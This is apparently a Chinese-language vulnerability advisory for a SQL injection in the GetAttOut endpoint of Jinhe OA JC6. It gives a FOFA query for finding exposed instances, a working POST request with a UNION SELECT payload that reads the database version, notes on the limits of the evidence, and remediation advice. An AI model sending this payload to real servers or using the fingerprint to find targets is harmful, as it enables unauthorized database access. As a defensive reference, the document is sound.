---
source: "https://github.com/jjjj1029056414/selfpoc/blob/7a66c01dcac7dde6fe9e4df50284002e62c0c05c/jinhe-getattout-sql.py"
fofa: "app=\"金和网络-金和OA\""
version: "未知"
---

# 金和OA GetAttOut SQL注入漏洞

## 漏洞描述

金和 OA JC6 的 `GetAttOut` 存在公开 SQL 注入 PoC。原始 PoC 通过 POST 请求体直接提交 UNION 查询，查询数据库版本；原新增文中的 GET 加省略参数与来源不符。

## 影响版本与前提

金和 OA JC6；确切受影响版本、修复版本及不同部署的鉴权条件未知。来源模板的请求未提供业务登录凭据；这不等于所有部署均可未授权利用。

## 网络测绘

```text
app="金和网络-金和OA"
```

## 公开验证资料

以下请求摘自公开来源，主机名如有展示统一为 `example.invalid`；仅作为授权环境中的资料参考。

```http
POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
Host: example.invalid
Content-Type: application/x-www-form-urlencoded

1' union select null,null,@@version,null,null,null--
```

## 判定与证据边界

原始 PoC 只匹配 HTTP 200 与 `success`，后续模板还检查 `attOEndTime`、`attOBeginTime`。这些业务标记本身不能确证注入；需在响应中辨认本次查询的数据库版本结果并与正常请求对照。本文不保留“调试残留”“完全无鉴权”等未经原始实现证实的说法。

本篇仅静态核对公开资料，未对目标发包，未运行利用工具，也未完成本地复现。

## 修复建议

向厂商核对当前安装版本与可用补丁，在完成修复前限制相关接口的访问。修复对应查询的输入拼接，使用参数化查询，并限制数据库账户权限。

## 参考来源

- [公开原始 PoC](https://github.com/jjjj1029056414/selfpoc/blob/7a66c01dcac7dde6fe9e4df50284002e62c0c05c/jinhe-getattout-sql.py)
- [公开检测模板](https://github.com/Co5mos/nuclei-tps/blob/5bc8b820acf9c992602cc7566e205e6cf1c463dd/http/vulnerabilities/jinhe/jinhe-oa-cj6-getattout-sql-injection.yaml)
